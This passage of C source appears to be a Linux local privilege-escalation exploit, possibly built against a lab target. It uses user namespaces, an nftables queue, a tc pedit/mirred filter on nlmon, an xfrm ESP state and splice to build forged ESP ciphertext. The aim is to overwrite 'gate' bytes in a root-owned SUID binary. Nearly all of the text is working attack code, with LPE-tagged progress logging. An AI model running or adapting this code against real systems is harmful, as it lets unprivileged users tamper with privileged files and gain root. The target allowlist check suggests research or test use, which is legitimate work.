    struct nlmsghdr *nlh;
    struct nlattr *hook, *list, *elem, *data;
    int fd, rc = 0, acks = 0, expect = 0;
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    char rbuf[8192];

    fd = nl_socket_open(NL_NETFILTER);
    if (fd < 0)
        return -1;

    nlh = nft_add(buf, &off, NFNL_MSG_BATCH_BEGIN_, AF_UNSPEC, 0);
    ((struct nfgen *)NLMSG_DATA(nlh))->res_id = HTONS(NFNL_SUBSYS_NFTABLES_);
    nft_done(buf, &off);

    nlh = nft_add(buf, &off, NFT_MSG_NEWTABLE_, NFPROTO_IPV4_,
                  NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK);
    expect++;
    nl_attr_str(nlh, NFTA_TABLE_NAME_, NFT_TABLE);
    nft_done(buf, &off);

    nlh = nft_add(buf, &off, NFT_MSG_NEWCHAIN_, NFPROTO_IPV4_,
                  NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK);
    expect++;
    nl_attr_str(nlh, NFTA_CHAIN_TABLE_, NFT_TABLE);
    nl_attr_str(nlh, NFTA_CHAIN_NAME_, NFT_CHAIN);
    nl_attr_str(nlh, NFTA_CHAIN_TYPE_, "filter");
    hook = nl_nest(nlh, NFTA_CHAIN_HOOK_);
    nl_attr_u32be(nlh, NFTA_HOOK_HOOKNUM_, NF_INET_LOCAL_OUT);
    nl_attr_u32be(nlh, NFTA_HOOK_PRIORITY_, 0);
    nl_nest_end(nlh, hook);
    nft_done(buf, &off);

    nlh = nft_add(buf, &off, NFT_MSG_NEWRULE_, NFPROTO_IPV4_,
                  NLM_F_CREATE | NLM_F_APPEND | NLM_F_ACK);
    expect++;
    nl_attr_str(nlh, NFTA_RULE_TABLE_, NFT_TABLE);
    nl_attr_str(nlh, NFTA_RULE_CHAIN_, NFT_CHAIN);
    list = nl_nest(nlh, NFTA_RULE_EXPRESSIONS_);
    elem = nl_nest(nlh, NFTA_LIST_ELEM_);
    nl_attr_str(nlh, NFTA_EXPR_NAME_, "queue");
    data = nl_nest(nlh, NFTA_EXPR_DATA_);
    nl_attr_u16(nlh, NFTA_QUEUE_NUM_, HTONS(0));
    nl_nest_end(nlh, data);
    nl_nest_end(nlh, elem);
    nl_nest_end(nlh, list);
    nft_done(buf, &off);

    nlh = nft_add(buf, &off, NFNL_MSG_BATCH_END_, AF_UNSPEC, 0);
    ((struct nfgen *)NLMSG_DATA(nlh))->res_id = HTONS(NFNL_SUBSYS_NFTABLES_);
    nft_done(buf, &off);

    if (sendto(fd, buf, off, 0, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        close(fd);
        return -1;
    }
    while (acks < expect) {
        ssize_t len = recv(fd, rbuf, sizeof(rbuf), 0);
        struct nlmsghdr *r;
        if (len <= 0)
            break;
        for (r = (struct nlmsghdr *)rbuf; NLMSG_OK(r, (unsigned)len);
             r = NLMSG_NEXT(r, len)) {
            if (r->nlmsg_type == NLMSG_ERROR) {
                struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(r);
                if (e->error) {
                    errno = (unsigned)(-e->error);
                    rc = -1;
                    goto out;
                }
                acks++;
            }
        }
    }
    if (acks < expect) {
        errno = EIO;
        rc = -1;
    }
out:
    close(fd);
    return rc;
}

/* ------------------------------------------------------------------ */
/* tc: clsact on nlmon0 egress, u32 match-all, pedit frame, mirred->lo  */
/* ------------------------------------------------------------------ */
struct tc_gen { uint32_t index; int32_t capab, action, refcnt, bindcnt; };
struct tc_pedit_key { uint32_t mask, val, off, at, offmask, shift; };
struct tc_pedit_sel {
    struct tc_gen gen;
    uint8_t nkeys, flags, shift, pad;
    struct tc_pedit_key keys[];
};
struct tc_mirred { struct tc_gen gen; int32_t eaction, ifindex; };
struct tc_u32_key { uint32_t mask, val; int32_t off, offmask; };
struct tc_u32_sel {
    uint8_t flags, offshift, nkeys;
    uint16_t offmask;
    uint16_t off;
    int16_t hoff;
    uint32_t hmask;
    struct tc_u32_key keys[];
};

static int tc_add_clsact(int fd, unsigned ifidx)
{
    char buf[256];
    struct nlmsghdr *nlh;
    struct tcmsg *tcm;

    nlh = nl_hdr(buf, RTM_NEWQDISC_, NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
                 sizeof(*tcm));
    tcm = NLMSG_DATA(nlh);
    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_ifindex = (int)ifidx;
    tcm->tcm_handle = TC_H_CLSACT_;
    tcm->tcm_parent = TC_H_CLSACT_;
    nl_attr_str(nlh, TCA_KIND_, "clsact");
    return nl_talk_ack(fd, buf);
}

static int tc_add_filter(int fd, unsigned mon_if, unsigned lo_if,
                         const uint8_t *frame, int frame_len)
{
    char buf[4096];
    struct nlmsghdr *nlh;
    struct tcmsg *tcm;
    struct nlattr *options, *actions, *action, *aopts;
    struct tc_pedit_sel *ps;
    struct tc_mirred *mi;
    struct tc_u32_sel *us;
    int nkeys = frame_len / 4, i;

    nlh = nl_hdr(buf, RTM_NEWTFILTER_, NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
                 sizeof(*tcm));
    tcm = NLMSG_DATA(nlh);
    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_ifindex = (int)mon_if;
    tcm->tcm_parent = TC_H_CLSACT_ | TC_H_MIN_EGRESS_;
    tcm->tcm_info = (1u << 16) | HTONS(ETH_P_ALL);

    nl_attr_str(nlh, TCA_KIND_, "u32");
    options = nl_nest(nlh, TCA_OPTIONS_);
    /* one zero-mask key at offset 0: matches every packet (terminal) */
    us = calloc(1, sizeof(*us) + sizeof(us->keys[0]));
    us->flags = TC_U32_TERMINAL_;
    us->nkeys = 1;
    nl_attr(nlh, TCA_U32_SEL_, us, sizeof(*us) + sizeof(us->keys[0]));
    free(us);

    actions = nl_nest(nlh, TCA_U32_ACT_);
    /* action 1: pedit — rewrite the linear prefix word by word */
    action = nl_nest(nlh, 1);
    nl_attr_str(nlh, TCA_ACT_KIND_, "pedit");
    aopts = nl_nest(nlh, TCA_ACT_OPTIONS_);
    ps = calloc(1, sizeof(*ps) + (size_t)nkeys * sizeof(ps->keys[0]));
    ps->gen.action = TC_ACT_PIPE_;
    ps->nkeys = (uint8_t)nkeys;
    for (i = 0; i < nkeys; i++) {
        uint32_t w;
        memcpy(&w, frame + i * 4, 4); /* LE load == pedit val semantics */
        ps->keys[i].mask = 0;
        ps->keys[i].val = w;
        ps->keys[i].off = (uint32_t)(i * 4);
    }
    nl_attr(nlh, TCA_PEDIT_PARMS_, ps,
            sizeof(*ps) + (size_t)nkeys * sizeof(ps->keys[0]));
    free(ps);
    nl_nest_end(nlh, aopts);
    nl_nest_end(nlh, action);
    /* action 2: mirred egress redirect to lo */
    action = nl_nest(nlh, 2);
    nl_attr_str(nlh, TCA_ACT_KIND_, "mirred");
    aopts = nl_nest(nlh, TCA_ACT_OPTIONS_);
    mi = calloc(1, sizeof(*mi));
    mi->gen.action = TC_ACT_STOLEN_;
    mi->eaction = TCA_EGRESS_REDIR_;
    mi->ifindex = (int)lo_if;
    nl_attr(nlh, TCA_MIRRED_PARMS_, mi, sizeof(*mi));
    free(mi);
    nl_nest_end(nlh, aopts);
    nl_nest_end(nlh, action);
    nl_nest_end(nlh, actions);
    nl_nest_end(nlh, options);
    return nl_talk_ack(fd, buf);
}

/* ------------------------------------------------------------------ */
/* helper children                                                      */
/* ------------------------------------------------------------------ */
struct nfqnl_cfg_cmd { uint8_t command, pad; uint16_t pf; };
struct nfqnl_cfg_params {
    uint32_t copy_range;
    uint8_t copy_mode;
} __attribute__((packed));
struct nfqnl_verdict_hdr { uint32_t verdict, id; };

static int helper_wfd; /* nfq helper -> parent: "pkt <id> <msglen>" */
static int recv_wfd;   /* udp receiver -> parent: "udp <len>" */

static void nfq_helper_child(void)
{
    int fd;
    char buf[65536], vbuf[512], line[64];
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    ssize_t n;
    struct nlmsghdr *nlh;
    struct nfgen *nfg;
    struct nfqnl_cfg_cmd *cmd;
    struct nfqnl_cfg_params *params;
    struct nfqnl_verdict_hdr vh;

    prctl(PR_SET_PDEATHSIG, SIGKILL);
    close(recv_wfd);
    fd = nl_socket_open(NL_NETFILTER);
    if (fd < 0)
        _exit(1);

    nlh = nl_hdr(buf, (uint16_t)((NFNL_SUBSYS_QUEUE_ << 8) | NFQNL_MSG_CONFIG_), 0,
                 sizeof(*nfg));
    nfg = NLMSG_DATA(nlh);
    nfg->family = AF_UNSPEC;
    nfg->version = NFNETLINK_V0_;
    nfg->res_id = HTONS(0);
    cmd = calloc(1, sizeof(*cmd));
    cmd->command = NFQNL_CFG_CMD_BIND_;
    cmd->pf = HTONS(AF_INET);
    nl_attr(nlh, NFQA_CFG_CMD_, cmd, sizeof(*cmd));
    free(cmd);
    if (sendto(fd, buf, nlh->nlmsg_len, 0, (struct sockaddr *)&sa, sizeof(sa)) < 0)
        _exit(1);

    nlh = nl_hdr(buf, (uint16_t)((NFNL_SUBSYS_QUEUE_ << 8) | NFQNL_MSG_CONFIG_), 0,
                 sizeof(*nfg));
    nfg = NLMSG_DATA(nlh);
    nfg->family = AF_UNSPEC;
    nfg->version = NFNETLINK_V0_;
    nfg->res_id = HTONS(0);
    params = calloc(1, sizeof(*params));
    params->copy_range = htonl(65535);
    params->copy_mode = NFQNL_COPY_PACKET_;
    nl_attr(nlh, NFQA_CFG_PARAMS_, params, sizeof(*params));
    free(params);
    nl_attr_u32be(nlh, NFQA_CFG_FLAGS_, NFQA_CFG_F_GSO_ | NFQA_CFG_F_UID_GID_);
    nl_attr_u32be(nlh, NFQA_CFG_MASK_, NFQA_CFG_F_GSO_ | NFQA_CFG_F_UID_GID_);
    if (sendto(fd, buf, nlh->nlmsg_len, 0, (struct sockaddr *)&sa, sizeof(sa)) < 0)
        _exit(1);

    for (;;) {
        n = recv(fd, buf, sizeof(buf), 0);
        if (n <= 0)
            _exit(1);
        for (nlh = (struct nlmsghdr *)buf;
             NLMSG_OK(nlh, (unsigned)n); nlh = NLMSG_NEXT(nlh, n)) {
            uint32_t id = 0;
            struct nlattr *a;
            int rem;
            if (nlh->nlmsg_type !=
                (uint16_t)((NFNL_SUBSYS_QUEUE_ << 8) | NFQNL_MSG_PACKET_))
                continue;
            a = (struct nlattr *)((char *)NLMSG_DATA(nlh) +
                                  NLMSG_ALIGN(sizeof(struct nfgen)));
            rem = (int)(nlh->nlmsg_len - NLMSG_HDRLEN -
                        NLMSG_ALIGN(sizeof(struct nfgen)));
            for (; rem >= (int)NLA_HDRLEN && a->nla_len >= NLA_HDRLEN &&
                   a->nla_len <= (uint32_t)rem;
                 a = (struct nlattr *)((char *)a + NLA_ALIGN(a->nla_len)),
                 rem -= (int)NLA_ALIGN(a->nla_len)) {
                if ((a->nla_type & NLA_F_NESTED) ||
                    (a->nla_type & NLA_TYPE_MASK) != NFQA_PACKET_HDR_ ||
                    a->nla_len < NLA_HDRLEN + 12)
                    continue;
                /* nfqnl_msg_packet_hdr: hw_protocol, hook, pad, packet_id */
                memcpy(&id, (char *)a + NLA_HDRLEN + 8, 4);
                id = ntohl(id);
            }
            snprintf(line, sizeof(line), "pkt %u %u\n", id, nlh->nlmsg_len);
            if (write(helper_wfd, line, strlen(line)) < 0)
                _exit(1);

            /* verdict NF_ACCEPT (no ack needed) */
            {
                struct nlmsghdr *v = nl_hdr(vbuf,
                        (uint16_t)((NFNL_SUBSYS_QUEUE_ << 8) | NFQNL_MSG_VERDICT_), 0,
                        sizeof(struct nfgen));
                struct nfgen *vg = NLMSG_DATA(v);
                vg->family = AF_UNSPEC;
                vg->version = NFNETLINK_V0_;
                vg->res_id = HTONS(0);
                vh.verdict = htonl(NF_ACCEPT);
                vh.id = htonl(id);
                nl_attr(v, NFQA_VERDICT_HDR_, &vh, sizeof(vh));
                if (sendto(fd, vbuf, v->nlmsg_len, 0,
                           (struct sockaddr *)&sa, sizeof(sa)) < 0)
                    _exit(1);
            }
        }
    }
}

static void udp_receiver_child(void)
{
    int s;
    struct sockaddr_in a;
    struct timeval tv = { .tv_sec = 30, .tv_usec = 0 };
    char buf[4096], line[64];
    ssize_t r;

    prctl(PR_SET_PDEATHSIG, SIGKILL);
    close(helper_wfd);
    s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0)
        _exit(1);
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port = htons(UDP_PORT);
    a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    if (bind(s, (struct sockaddr *)&a, sizeof(a)) < 0)
        _exit(1);
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    for (;;) {
        r = recv(s, buf, sizeof(buf), 0);
        if (r <= 0)
            break;
        snprintf(line, sizeof(line), "udp %zd\n", r);
        if (write(recv_wfd, line, strlen(line)) < 0)
            _exit(1);
    }
    _exit(0);
}

/* ------------------------------------------------------------------ */
/* line readers over pipes (with poll timeout)                          */
/* ------------------------------------------------------------------ */
struct lreader {
    int fd;
    char buf[512];
    size_t len, pos;
};

static int lr_line(struct lreader *lr, char *out, size_t sz, int timeout_ms)
{
    struct pollfd pfd = { .fd = lr->fd, .events = POLLIN };
    while (timeout_ms >= 0) {
        size_t i;
        for (i = lr->pos; i < lr->len; i++)
            if (lr->buf[i] == '\n') {
                size_t n = i - lr->pos;
                if (n >= sz)
                    n = sz - 1;
                memcpy(out, lr->buf + lr->pos, n);
                out[n] = 0;
                lr->pos = i + 1;
                return 0;
            }
        if (lr->pos < lr->len) {
            memmove(lr->buf, lr->buf + lr->pos, lr->len - lr->pos);
            lr->len -= lr->pos;
            lr->pos = 0;
        } else {
            lr->len = 0;
            lr->pos = 0;
        }
        if (lr->len == sizeof(lr->buf))
            return -1; /* line too long */
        if (poll(&pfd, 1, timeout_ms ? 100 : 0) <= 0) {
            if (timeout_ms <= 100)
                return -1;
            timeout_ms -= 100;
            continue;
        }
        {
            ssize_t r = read(lr->fd, lr->buf + lr->len,
                             sizeof(lr->buf) - lr->len);
            if (r <= 0)
                return -1;
            lr->len += (size_t)r;
        }
    }
    return -1;
}

/* ------------------------------------------------------------------ */
/* attack geometry + packet builder                                     */
/* ------------------------------------------------------------------ */
struct attack {
    int fs;        /* observed frag_start == pedit frame length */
    int msg_len;   /* fs + PAYLOAD */
    int ct_len;    /* msg_len - HDRS - 16 (ICV) */
    int fso;       /* ct offset of the 8 target bytes: fs - HDRS */
    int keys;      /* fs / 4 pedit keys */
    int nb;        /* ct_len / 16 blocks */
    int b;         /* block index holding the target bytes */
    int gof;       /* target-bytes offset inside block b */
    uint8_t frame[FS_MAX];
    uint8_t vector[VEC_LEN];
    uint8_t esp[HDRS + 1024]; /* hdr+IV+ct+ICV scratch */
};

static uint8_t g_rk[176]; /* AES-128 round keys for ENC_KEY */

static uint16_t ip_checksum(const uint8_t *h, int len)
{
    uint32_t sum = 0;
    int i;
    for (i = 0; i < len; i += 2)
        sum += (uint32_t)((h[i] << 8) | h[i + 1]);
    while (sum >> 16)
        sum = (sum & 0xffff) + (sum >> 16);
    return (uint16_t)(~sum & 0xffff);
}

static int build_attack(struct attack *A, int fs, const uint8_t gate[8],
                        const uint8_t want[8])
{
    uint8_t *ct, tmp[16], p0[BLK], plast[BLK], xin[BLK], mac[32];
    int i;
    struct udphdr *uh;
    size_t esp_len;

    memset(A, 0, sizeof(*A));
    A->fs = fs;
    A->msg_len = fs + PAYLOAD;
    A->ct_len = A->msg_len - HDRS - IV_LEN; /* minus the 16-byte ICV */
    A->fso = fs - HDRS;
    A->keys = fs / 4;
    A->nb = A->ct_len / BLK;
    A->b = A->fso / BLK;
    A->gof = A->fso % BLK;

    /* geometry guards: the target block must have a fully controlled
     * predecessor block (inside the pedit frame), and the last block
     * (ESP trailer) must not be the target block */
    if (fs % BLK || A->ct_len % BLK || fs < FS_MIN || fs > FS_MAX ||
        A->b < 2 || A->b >= A->nb - 1)
        return -1;

    ct = A->esp + ESP_HDR + IV_LEN;
    esp_len = (size_t)(ESP_HDR + IV_LEN + A->ct_len);
    for (i = 0; i < A->ct_len; i++)
        ct[i] = (uint8_t)(PATTERN + i);

    /* ESP header + the file's current gate bytes as ciphertext */
    {
        uint32_t spi = htonl(SPI_VAL), seq = htonl(1);
        memcpy(A->esp + 0, &spi, 4);
        memcpy(A->esp + 4, &seq, 4);
    }
    memcpy(ct + A->fso, gate, TGT_BYTES);

    /* P_b = D(C_b) ^ C_{b-1}: choose C_{b-1} so the 8 target plaintext
     * bytes equal `want` */
    aes128_dec(g_rk, ct + A->b * BLK, tmp);
    for (i = 0; i < TGT_BYTES; i++)
        ct[(A->b - 1) * BLK + A->gof + i] =
            (uint8_t)(tmp[A->gof + i] ^ want[i]);

    /* inner UDP header must decrypt into P_0: derive the IV.
     * P_0 = udphdr(sport,dport,ulen,0) + 8 free data bytes */
    uh = (struct udphdr *)p0;
    uh->source = htons(UDP_PORT);
    uh->dest = htons(UDP_PORT);
    uh->len = htons((uint16_t)(A->ct_len - 8));
    uh->check = 0;
    for (i = 8; i < BLK; i++)
        p0[i] = (uint8_t)(PATTERN + i);
    aes128_dec(g_rk, ct + 0, tmp);
    for (i = 0; i < BLK; i++)
        A->esp[ESP_HDR + i] = (uint8_t)(tmp[i] ^ p0[i]);

    /* ESP trailer lives in the last plaintext block: 6 bytes pad,
     * padlen=6, nexthdr=17 (UDP). C_last = E(P_last ^ C_{last-1}) */
    for (i = 0; i < 8; i++)
        plast[i] = (uint8_t)(PATTERN + 0x80 + i);
    memset(plast + 8, 0, 6);
    plast[14] = 6;
    plast[15] = 17;
    for (i = 0; i < BLK; i++)
        xin[i] = (uint8_t)(plast[i] ^ ct[(A->nb - 2) * BLK + i]);
    aes128_enc(g_rk, xin, ct + (A->nb - 1) * BLK);

    /* ICV = HMAC-SHA256(auth key) over ESP header + IV + ct, truncated */
    hmac_sha256((const uint8_t *)AUTH_KEY, 32, A->esp, esp_len, mac);
    memcpy(A->esp + esp_len, mac, 16);

    /* pedit frame: Eth + IP + ESP hdr + IV + ct[0..fso) */
    memset(A->frame, 0, (size_t)fs);
    A->frame[12] = 0x08;
    A->frame[13] = 0x00;
    A->frame[14] = 0x45;
    A->frame[16] = (uint8_t)((A->msg_len - ETH_HDR) >> 8);
    A->frame[17] = (uint8_t)(A->msg_len - ETH_HDR);
    A->frame[18] = 0x33;
    A->frame[19] = 0x42;
    A->frame[22] = 64;
    A->frame[23] = IPPROTO_ESP;
    {
        uint32_t loopback = htonl(INADDR_LOOPBACK);
        memcpy(A->frame + 26, &loopback, 4);
        memcpy(A->frame + 30, &loopback, 4);
    }
    {
        uint16_t sum = ip_checksum(A->frame + 14, IP_HDR);
        A->frame[24] = (uint8_t)(sum >> 8);
        A->frame[25] = (uint8_t)sum;
    }
    memcpy(A->frame + 34, A->esp, (size_t)(fs - 34));

    /* spliced vector = ct[fso+8 .. ct_len) || ICV */
    memcpy(A->vector, ct + A->fso + TGT_BYTES,
           (size_t)(A->ct_len - A->fso - TGT_BYTES));
    memcpy(A->vector + (A->ct_len - A->fso - TGT_BYTES), A->esp + esp_len, 16);

    return 0;
}

/* ------------------------------------------------------------------ */
/* splice-backed sender                                                 */
/* ------------------------------------------------------------------ */
static int splice_send(int sock, int fd1, off_t off1, size_t n1,
                       int fd2, off_t off2, size_t n2)
{
    int pfd[2];
    size_t total = n1 + n2;

    if (pipe(pfd))
        return -1;
    if (splice(fd1, &off1, pfd[1], NULL, n1, 0) != (ssize_t)n1)
        goto fail;
    if (n2 && splice(fd2, &off2, pfd[1], NULL, n2, 0) != (ssize_t)n2)
        goto fail;
    if (splice(pfd[0], NULL, sock, NULL, total, 0) != (ssize_t)total)
        goto fail;
    close(pfd[0]);
    close(pfd[1]);
    return 0;
fail:
    close(pfd[0]);
    close(pfd[1]);
    return -1;
}

static int memfd_with(const uint8_t *data, size_t len)
{
    int fd = syscall(SYS_memfd_create, "zfq-vec", 0);
    if (fd < 0)
        return -1;
    if (write(fd, data, len) != (ssize_t)len) {
        close(fd);
        return -1;
    }
    return fd;
}

/* ------------------------------------------------------------------ */
/* main sequence                                                        */
/* ------------------------------------------------------------------ */
static int crypto_selfcheck(void)
{
    static const uint8_t key[16] = { 0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 };
    static const uint8_t pt[16] = {
        0x00,0x11,0x22,0x33,0x44,0x55,0x66,0x77,
        0x88,0x99,0xaa,0xbb,0xcc,0xdd,0xee,0xff
    };
    static const uint8_t want[16] = {
        0x69,0xc4,0xe0,0xd8,0x6a,0x7b,0x04,0x30,
        0xd8,0xcd,0xb7,0x80,0x70,0xb4,0xc5,0x5a
    };
    static const char abc[] = "abc";
    static const char sha_abc[] =
        "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad";
    uint8_t rk[176], out[16], dg[32], back[16];
    char hex[65];
    int aes_ok = 1, sha_ok = 1;

    aes128_expand(key, rk);
    aes128_enc(rk, pt, out);
    aes128_dec(rk, out, back);
    if (memcmp(out, want, 16) != 0 || memcmp(back, pt, 16) != 0)
        aes_ok = 0;
    sha256(abc, 3, dg);
    hexs(dg, 32, hex);
    if (strcmp(hex, sha_abc) != 0)
        sha_ok = 0;
    P("LPE-CRYPTO aes128=%s sha256=%s",
      aes_ok ? "PASS" : "FAIL", sha_ok ? "PASS" : "FAIL");
    return aes_ok && sha_ok ? 0 : -1;
}

static int run_gate(char *out, size_t outsz)
{
    int pfd[2];
    pid_t pid;
    size_t got = 0;
    int st;

    if (pipe(pfd))
        return -1;
    fflush(NULL);
    pid = fork();
    if (pid < 0) {
        close(pfd[0]);
        close(pfd[1]);
        return -1;
    }
    if (pid == 0) {
        dup2(pfd[1], 1);
        close(pfd[0]);
        close(pfd[1]);
        execl(TARGET_PATH, "secretgate", (char *)NULL);
        _exit(127);
    }
    close(pfd[1]);
    while (got + 1 < outsz) {
        ssize_t r = read(pfd[0], out + got, outsz - 1 - got);
        if (r <= 0)
            break;
        got += (size_t)r;
    }
    out[got] = 0;
    close(pfd[0]);
    waitpid(pid, &st, 0);
    return st;
}

static int sha256_file(const char *path, char hex[65])
{
    int fd = open(path, O_RDONLY);
    uint8_t buf[65536];
    sha256_ctx c;
    uint8_t dg[32];
    ssize_t r;

    if (fd < 0)
        return -1;
    sha256_init(&c);
    while ((r = read(fd, buf, sizeof(buf))) > 0)
        sha256_update(&c, buf, (size_t)r);
    close(fd);
    if (r < 0)
        return -1;
    sha256_final(&c, dg);
    hexs(dg, 32, hex);
    return 0;
}

int main(void)
{
    struct stat st;
    struct attack A;
    struct lreader lrh = {0}, lrr = {0};
    uint8_t gate[8], cur[8];
    char sha_before[65], sha_after[65], line[128], gate_out[512];
    char gate_hex[17], want_hex[17];
    int tfd, probe_fd, self_fd, vec_fd, udp, mon_if, lo_if, nlfd;
    int hpfd[2], rpfd[2];
    pid_t helper, rcvr;
    int fs, i, diverged = 0, captured = 0;
    uint8_t probe_buf[PAYLOAD];
    uint8_t self_buf[PAYLOAD];
    uid_t real_uid = getuid();
    gid_t real_gid = getgid();

    alarm(120);
    setvbuf(stdout, NULL, _IOLBF, 0);

    P("LPE-START uid=%d euid=%d target=%s gate_off=%d",
      getuid(), geteuid(), TARGET_PATH, GATE_OFF);

    /* ---- 1. allowlist + target verification (S10) ------------------ */
    tfd = open(TARGET_PATH, O_RDONLY);
    if (tfd < 0)
        refused("open(O_RDONLY) failed");
    if (fstat(tfd, &st) < 0)
        refused("fstat failed");
    if (!S_ISREG(st.st_mode))
        refused("not a regular file");
    if (!(st.st_mode & S_ISUID))
        refused("SUID bit not set");
    if (st.st_uid != 0 || st.st_gid != 0)
        refused("not root-owned");
    if (pread(tfd, gate, 8, GATE_OFF) != 8)
        refused("cannot read gate bytes");
    if (memcmp(gate, GATE_LOCKED, 8) != 0)
        refused("gate bytes are not GATELOCK (build mismatch?)");
    if (sha256_file(TARGET_PATH, sha_before) < 0)
        refused("sha256 before failed");
    hexs(gate, 8, gate_hex);
    hexs(GATE_OPEN, 8, want_hex);
    P("LPE-TARGET path=%s dev=%llu ino=%llu uid=%u gid=%u mode=%o size=%lld",
      TARGET_PATH, (unsigned long long)st.st_dev, (unsigned long long)st.st_ino,
      st.st_uid, st.st_gid, st.st_mode, (long long)st.st_size);
    P("LPE-GATE off=%d before=%s want=%s", GATE_OFF, gate_hex, want_hex);
    P("LPE-SHA256-BEFORE %s", sha_before);

    /* ---- 2. crypto self-check -------------------------------------- */
    aes_init_tables();
    aes128_expand((const uint8_t *)ENC_KEY, g_rk);
    if (crypto_selfcheck() < 0)
        fatal("crypto self-check");

    /* ---- 3. user+net namespace ------------------------------------- */
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0)
        fatal("unshare(CLONE_NEWUSER|CLONE_NEWNET) "
              "(CONFIG_USER_NS/CONFIG_NET_NS?)");
    {
        char map[64];
        if (write_file("/proc/self/setgroups", "deny") < 0)
            fatal("setgroups deny");
        snprintf(map, sizeof(map), "0 %u 1", real_uid);
        if (write_file("/proc/self/uid_map", map) < 0)
            fatal("uid_map");
        snprintf(map, sizeof(map), "0 %u 1", real_gid);
        if (write_file("/proc/self/gid_map", map) < 0)
            fatal("gid_map");
    }
    P("LPE-USERNS unshare=OK uid=%d euid=%d (ns-root, fresh netns)",
      getuid(), geteuid());

    /* ---- 4. links + sysctls ---------------------------------------- */
    if (write_file("/proc/sys/net/ipv4/conf/lo/route_localnet", "1") < 0 ||
        write_file("/proc/sys/net/ipv4/conf/lo/accept_local", "1") < 0)
        fatal("lo sysctls");
    if (link_flags("lo", IFF_UP) < 0)
        fatal("lo up");
    if (create_nlmon() < 0)
        fatal("nlmon0 create (CONFIG_NLMON?)");
    if (link_flags(NL_MON, IFF_UP) < 0)
        fatal("nlmon0 up");
    mon_if = ifindex_of(NL_MON);
    lo_if = ifindex_of("lo");
    if (!mon_if || !lo_if)
        fatal("ifindex lookup");
    P("LPE-NETNS lo=up(%d) nlmon0=up(%d)", lo_if, mon_if);

    /* ---- 5. nft LOCAL_OUT -> queue 0 ------------------------------- */
    if (nft_queue_setup() < 0)
        fatal("nft queue rule (CONFIG_NF_TABLES/NFT_QUEUE?)");
    P("LPE-NFT table=%s chain=%s hook=LOCAL_OUT queue=0", NFT_TABLE, NFT_CHAIN);

    /* ---- 6. helper children ---------------------------------------- */
    if (pipe(hpfd) || pipe(rpfd))
        fatal("pipes");
    helper_wfd = hpfd[1];
    recv_wfd = rpfd[1];
    fflush(NULL);
    helper = fork();
    if (helper < 0)
        fatal("fork helper");
    if (helper == 0) {
        close(hpfd[0]);
        nfq_helper_child();
        _exit(1);
    }
    close(hpfd[1]);
    rcvr = fork();
    if (rcvr < 0)
        fatal("fork receiver");
    if (rcvr == 0) {
        close(rpfd[0]);
        udp_receiver_child();
        _exit(1);
    }
    close(rpfd[1]);
    lrh.fd = hpfd[0];
    lrr.fd = rpfd[0];
    P("LPE-NFQ queue=0 copy_mode=PACKET copy_range=65535 flags=GSO|UID_GID");

    /* ---- 7. probe: learn the queue message geometry ----------------- */
    for (i = 0; i < PAYLOAD; i++)
        probe_buf[i] = (uint8_t)(PATTERN + i);
    probe_fd = memfd_with(probe_buf, PAYLOAD);
    if (probe_fd < 0)
        fatal("probe memfd");
    udp = socket(AF_INET, SOCK_DGRAM, 0);
    {
        struct sockaddr_in a;
        memset(&a, 0, sizeof(a));
        a.sin_family = AF_INET;
        a.sin_port = htons(UDP_PORT);
        a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        if (connect(udp, (struct sockaddr *)&a, sizeof(a)) < 0)
            fatal("connect udp");
    }
    if (splice_send(udp, probe_fd, 0, PAYLOAD, -1, 0, 0) < 0)
        fatal("probe splice send");
    if (lr_line(&lrh, line, sizeof(line), 5000) < 0)
        fatal("probe: no NFQUEUE message");
    {
        unsigned id, mlen;
        if (sscanf(line, "pkt %u %u", &id, &mlen) != 2)
            fatal("probe: bad helper line");
        fs = (int)mlen - PAYLOAD;
        P("LPE-PROBE packet_id=%u nfq_msglen=%u frag_start=%d", id, mlen, fs);
    }
    if (lr_line(&lrr, line, sizeof(line), 5000) < 0)
        P("LPE-PROBE-WARN original UDP not received (verdict path?)");
    else
        P("LPE-PROBE-ORIGINAL-UDP %s", line);

    /* ---- 8. build the attack, install xfrm + tc --------------------- */
    if (build_attack(&A, fs, gate, GATE_OPEN) < 0)
        fatal("unsupported queue-message geometry (frag_start out of range)");
    P("LPE-GEOM msg_len=%d ct_len=%d fso=%d pedit_keys=%d vector=%d",
      A.msg_len, A.ct_len, A.fso, A.keys, VEC_LEN);
    if (xfrm_setup() < 0)
        fatal("xfrm state/policy (CONFIG_XFRM_USER/INET_ESP?)");
    P("LPE-XFRM state=127.0.0.1-esp-0x%x-transport "
      "auth=hmac(sha256)-128 enc=cbc(aes) policy=dir_in", SPI_VAL);
    nlfd = nl_socket_open(NETLINK_ROUTE);
    if (nlfd < 0)
        fatal("route netlink socket");
    if (tc_add_clsact(nlfd, (unsigned)mon_if) < 0)
        fatal("tc clsact (CONFIG_NET_SCH_INGRESS?)");
    if (tc_add_filter(nlfd, (unsigned)mon_if, (unsigned)lo_if,
                      A.frame, A.fs) < 0)
        fatal("tc u32+pedit+mirred (CONFIG_NET_CLS_U32/ACT_PEDIT/ACT_MIRRED?)");
    close(nlfd);
    P("LPE-TC device=%s hook=egress classifier=u32 pedit_keys=%d "
      "redirect=lo status=PASS", NL_MON, A.keys);

    /* ---- 9. selftest: vector-only, no file pages -------------------- */
    memcpy(self_buf, gate, TGT_BYTES);
    memcpy(self_buf + TGT_BYTES, A.vector, VEC_LEN);
    self_fd = memfd_with(self_buf, PAYLOAD);
    if (self_fd < 0)
        fatal("selftest memfd");
